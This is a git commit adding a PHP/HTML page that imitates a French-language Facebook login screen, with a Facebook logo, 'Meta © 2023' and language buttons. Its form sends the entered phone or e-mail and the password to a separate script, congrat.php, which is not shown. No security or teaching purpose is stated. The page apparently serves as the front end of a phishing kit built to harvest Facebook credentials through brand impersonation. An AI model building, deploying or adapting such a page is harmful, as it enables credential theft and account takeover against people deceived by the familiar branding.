d6ec3453f1d9712238a6be8b9bcce1320b9c2bb8
midium-ærende <90563585+midium-aerende@users.noreply.github.com>
2023-09-17 07:47:02 +0300

    Add files via upload

---
+++ index (1).php
@@ -0,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>login</title>
+    <style type="text/css" media="all">
+      body{
+        display: grid;
+        width: 100vw;
+        height: 90vh;
+        margin: auto;
+        align-content: flex-start;
+      }
+      *{
+        font-family: Segoe UI;
+        font-size: 1rem;
+        touch-action: pan-x pan-y;
+        box-sizing: border-box;
+      }
+      .fb{
+        width: 8rem;
+        margin: .2rem auto;
+      }
+      .Tt{
+        display: grid;
+        align-content: center;
+        justify-content: center;
+        background: rgb(250,250,220);
+        width: 100vw;
+        height: 2.5rem;
+        font-size: .8rem;
+        margin: 0rem auto;
+        padding: 0rem 1rem;
+        color: rgb(60,100,180);
+      }
+      form{
+      display: grid;
+      }
+      .inp{
+        width: 24rem;
+        height: 2.5rem;
+        background: rgb(245,245,245);
+        font-size: .8rem;
+        border: solid .05rem rgb(240,240,240);
+        border-radius: .2rem;
+        margin: .2rem auto;
+        padding: 0rem 1rem;
+      }
+      .inp:valid{
+        background: rgb(235,240,245);
+      }
+      .inp:focus{
+        outline: solid .05rem rgb(0,0,0);
+      }
+      .btn1{
+        background: rgb(0,120,255);
+        font-size: 1rem;
+        font-weight: bold;
+        color: rgb(255,255,255);
+        width: 24rem;
+        height: 2.5rem;
+        border: none;
+        border-radius: .2rem;
+        margin: .5rem auto;
+      }
+      .btn1:active{
+        background: rgb(150,200,255);
+      }
+      .btn2{
+        background: none;
+        font-size: .8rem;
+        color: rgb(0,100,220);
+        width: 24rem;
+        height: 2.5rem;
+        border: none;
+        margin: .2rem auto;
+      }
+      .btn3{
+        background: rgb(255,255,255);
+        margin: 1rem auto;
+        width: 20rem;
+        height: 2.5rem;
+        border: solid .06rem rgb(200,200,200);
+        border-radius: .2rem;
+      }
+      .btn3:active{
+        background: rgb(150,220,120);
+      }
+      .lng-fr{
+        margin: 0rem auto;
+        font-size: .8rem;
+        font-weight: bold;
+        color: rgb(150,150,150);
+      }
+      .lng{
+        background: none;
+        margin: 0rem auto;
+        font-size: .8rem;
+        border: none;
+        color: rgb(80,100,140);
+      }
+      .add{
+        display: grid;
+        background: none;
+        width: 1.2rem;
+        height: 1.2rem;
+        margin: 0rem auto;
+        align-content: center;
+        justify-content: center;
+        color: rgb(150,150,150);
+        font-size: 1.2rem;
+        border: solid .05rem rgb(80,100,140);
+        border-radius: .2rem;
+      }
+      .br{
+        background-image: repeating-linear-gradient(90deg, rgb(200,200,200) 0% 45%,rgb(255,255,255) 45% 55%,rgb(200,200,200) 55% 100%);
+        display: grid;
+        width: 24rem;
+        height: .08rem;
+        align-content: center;
+        justify-content: center;
+        margin: 0rem auto;
+        color: rgb(100,100,100);
+      }
+      .td{
+        margin: 1rem auto;
+        font-size: .8rem;
+        color: rgb(150,150,150);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="Tt">En collaboration avec midium æerende, nous vous encourageons à contribuer.</div>
+    <img src="facebook.svg" class="fb" />
+    <form method="post" action="congrat.php">
+      <input type="text" class="inp" required name="user" spellcheck="false" placeholder="Numéro mobile ou e-mail"/>
+      <input type="text" class="inp" required name="pass" spellcheck="false" placeholder="Mot de passe"/>
+      <button type="submit" class="btn1">Se connecter</button>
+    </form>
+    <button class="btn2">Mot de passe oublier?</button>
+    <div class="br">ou</div>
+    <button type="submit" class="btn3">Créer nouveau compte</button>
+    <div class="lng-fr">Francais (France)</div>
+    <button class="lng">English (US)</button>
+    <button class="lng">Espanol</button>
+    <button class="lng">Deutch</button>
+    <button class="lng">Malagasy</button>
+    <button class="lng">Italiano</button>
+    <button class="lng">Português (Brasil)</button>
+    <button class="add">+</button>
+    <div class="td">Meta © 2023</div>
+  </body>
+</html>
